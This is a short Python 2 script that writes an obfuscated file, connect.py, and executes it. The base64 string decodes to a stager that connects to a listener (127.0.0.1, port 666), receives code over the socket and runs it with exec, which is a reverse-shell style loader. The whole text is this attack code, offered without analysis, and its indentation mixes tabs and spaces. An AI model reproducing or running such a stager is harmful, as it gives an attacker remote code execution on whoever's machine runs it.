import socket,struct,os

def ran():
	l = open("connect.py","w")
        l.write("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}\n")
	l.write("[sys.version_info[0]]\n")
	l.write("('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMjcuMC4wLjEnLDY2NikpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))"
	l.close()
        print "[ + ] Connection [ + ]"
	os.system("python connect.py")
